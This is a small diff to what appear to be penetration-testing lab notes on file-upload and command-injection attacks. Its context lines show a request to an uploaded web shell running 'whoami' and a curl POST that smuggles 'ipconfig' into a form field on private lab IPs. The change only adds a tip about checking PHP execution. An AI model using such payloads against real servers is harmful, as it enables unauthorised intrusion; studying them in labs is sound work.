@@ -30,7 +30,9 @@ http://192.168.204.187/uploads/simple-backdoor.evil?cmd=whoami
 curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
 ```
 
-We can test our uploaded payloads to see if the backend is executing php with hello script:
+>[!Tip:]
+>We can test our uploaded payloads to see if the backend is executing php with hello script:
+
 ```php
 <?php echo "Hello, World!"; ?>
 ```
